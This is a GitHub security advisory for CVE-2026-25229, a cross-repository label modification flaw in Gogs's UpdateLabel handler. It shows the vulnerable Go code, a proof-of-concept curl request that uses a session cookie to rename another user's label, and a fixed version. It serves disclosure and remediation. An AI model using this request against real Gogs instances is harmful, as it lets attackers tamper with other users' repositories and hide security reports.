# [M] Gogs has an Authorization Bypass Allows Cross-Repository Label Modification in Gogs

## Summary
Severity: Medium
Advisory: GHSA-cv22-72px-f4gh
CVE: CVE-2026-25229
CWE: CWE-284
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-17
Source: https://github.com/advisories/GHSA-cv22-72px-f4gh
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.14.0

## Details
### **Summary**
A broken access control vulnerability in Gogs allows authenticated users with write access to any repository to modify labels belonging to other repositories. The `UpdateLabel` function in the Web UI (`internal/route/repo/issue.go`) fails to verify that the label being modified belongs to the repository specified in the URL path, enabling cross-repository label tampering attacks.

### **Details**
The vulnerability exists in the Web UI's label update endpoint `POST /:username/:reponame/labels/edit`. The handler function `UpdateLabel` uses an incorrect database query function that bypasses repository ownership validation:

**Vulnerable Code** (`internal/route/repo/issue.go:1040-1054`):

```plain
func UpdateLabel(c *context.Context, f form.CreateLabel) {
    l, err := database.GetLabelByID(f.ID)  // ❌ No repository validation
    if err != nil {
        c.NotFoundOrError(err, "get label by ID")
        return
    }

    // ❌ Missing validation: l.RepoID != c.Repo.Repository.ID
    l.Name = f.Title
    l.Color = f.Color
    if err := database.UpdateLabel(l); err != nil {
        c.Error(err, "update label")
        return
    }
    c.RawRedirect(c.Repo.MakeURL("labels"))
}
```

**Root Cause**:

1. The function calls `database.GetLabelByID(f.ID)` which internally passes `repoID=0` to the ORM layer
2. According to code comments in `internal/database/issue_label.go:147-166`, passing `repoID=0` causes the ORM to ignore repository restrictions
3. No validation checks whether `l.RepoID == c.Repo.Repository.ID` before updating
4. The middleware `reqRepoWriter()` only validates write access to the repository in the URL path, not the label's actual repository

**Inconsistency with Other Functions**:

+ `NewLabel`: Correctly sets `RepoID = c.Repo.Repository.ID`
+ `DeleteLabel`: Correctly uses `database.DeleteLabel(c.Repo.Repository.ID, id)`
+ API `EditLabel`: Correctly uses `database.GetLabelOfRepoByID(c.Repo.Repository.ID, id)`

- ****Only `UpdateLabel` in ****Web UI**** uses the vulnerable pattern****

### **PoC**
**Prerequisites**:

+ Two user accounts: Alice (attacker) and Bob (victim)
+ alice has written access to repo-a
+ Bob owns repo-b with labels

**Step 1: Identify Target Label ID**

1. Login as bob, navigate to bob/repo-b/labels
2. Open browser DevTools (F12) → Network tab
3. Click edit on any label
4. Observe the form data: id=<LABEL_ID>
5. Example: id=1

**Step 2: Execute Attack**

```plain
# Login as alice, get session cookie
# Open DevTools → Application → Cookies → i_like_gogs
# Copy the cookie value

# Send malicious request
curl -X POST "http://localhost:3000/alice/repo-a/labels/edit" \
  -H "Cookie: i_like_gogs=<ALICE_SESSION_COOKIE>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "id=1&title=HACKED-BY-ALICE&color=%23000000"

# Expected response: 302 Found (redirect)
```

**Step 3: Verify Impact**

1. Login as bob
2. Navigate to bob/repo-b/labels
3. Observe: Label "P0-Critical" is now "HACKED-BY-ALICE" with black color

### **Impact**
1. **Issue Classification Disruption**: Modify critical labels (e.g., "P0-Critical" → "P3-Low") causing urgent issues to be deprioritized

2. **Security Issue Concealment**: Change "security" labels to "documentation" to hide vulnerability reports from security teams

3. **Workflow**** Sabotage**: Alter labels used in CI/CD automation, breaking deployment pipelines

4. **Mass Disruption**: Batch modifies all labels across multiple repositories using ID enumeration

**Recommended Fix**:

```plain
func UpdateLabel(c *context.Context, f form.CreateLabel) {
    l, err := database.GetLabelOfRepoByID(c.Repo.Repository.ID, f.ID)
    if err != nil {
        c.NotFoundOrError(err, "get label of repository by ID")
        return
    }
    // Now label ownership is validated at database layer
    l.Name = f.Title
    l.Color = f.Color
    if err := database.UpdateLabel(l); err != nil {
        c.Error(err, "update label")
        return
    }
    c.RawRedirect(c.Repo.MakeURL("labels"))
}
```

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-cv22-72px-f4gh
- https://nvd.nist.gov/vuln/detail/CVE-2026-25229
- https://github.com/gogs/gogs/commit/643a6d6353cb6a182a4e1f0720228727f30a3ad2
- https://github.com/gogs/gogs
